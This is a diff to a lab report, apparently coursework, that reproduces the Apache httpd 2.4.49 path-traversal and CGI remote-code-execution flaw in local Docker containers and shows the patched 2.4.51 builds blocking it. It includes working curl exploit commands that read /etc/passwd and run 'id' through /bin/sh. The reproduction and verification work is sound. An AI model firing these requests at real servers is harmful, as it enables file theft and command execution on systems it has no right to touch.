@@ -137,6 +137,8 @@ $ pip-audit -r requirements.txt
 No known vulnerabilities found
 ```
 
+![Local security checks](docs/screenshots/api-local.png)
+
 ### CI screenshots
 
 `<insert screenshot of the green Actions run>`
@@ -164,9 +166,19 @@ docker compose build
 docker compose up -d
 ```
 
-The service listens on `http://localhost:8080`. The Vulhub Dockerfile enables
+The service listens on `http://127.0.0.1:8080`. The Vulhub Dockerfile enables
 `mod_cgi`/`mod_cgid` and replaces the default `<Directory />` policy with
 `Require all granted`.
+
+When Docker Hub is unreachable, the images can be pulled through a registry
+mirror and retagged locally:
+
+```bash
+docker pull dockerproxy.net/vulhub/httpd:2.4.49
+docker tag  dockerproxy.net/vulhub/httpd:2.4.49 vulhub/httpd:2.4.49
+docker pull dockerproxy.net/library/httpd:2.4.51
+docker tag  dockerproxy.net/library/httpd:2.4.51 httpd:2.4.51
+```
 
 ### 6.3 Reproduction
 
@@ -174,7 +186,7 @@ File disclosure:
 
 ```bash
 curl -v --path-as-is \
-  http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
 The response contains the host container's `/etc/passwd`, including
@@ -184,7 +196,7 @@ Command execution:
 
 ```bash
 curl -v --data "echo;id" \
-  'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
 ```
 
 The response contains `uid=...`, proving that `/bin/sh` was executed outside
@@ -234,21 +246,17 @@ Expected result:
 | Environment | `/` | Traversal | `/etc/passwd` | `id` via CGI |
 |---|---|---|---|---|
 | Vulhub 2.4.49 | 200 | 200 | disclosed | executed |
-| 2.4.51 permissive | 200 | 404 | blocked | blocked |
-| 2.4.51 hardened | 200 | 403/404 | blocked | blocked |
+| 2.4.51 permissive | 200 | 400 | blocked | blocked |
+| 2.4.51 hardened | 200 | 400 | blocked | blocked |
 
 The `200` on `/` in the fixed environments is the regression check: the normal
 web service still works after the patch.
 
 ### 6.7 Screenshots
 
-`<insert vulnerable traversal screenshot>`
+![Vulnerable traversal and CGI execution](docs/screenshots/cve-before.png)
 
-`<insert vulnerable CGI RCE screenshot>`
-
-`<insert fixed traversal screenshot>`
-
-`<insert regression test screenshot>`
+![Fixed environments and regression test](docs/screenshots/cve-after.png)
 
 ## 7. Conclusion
 
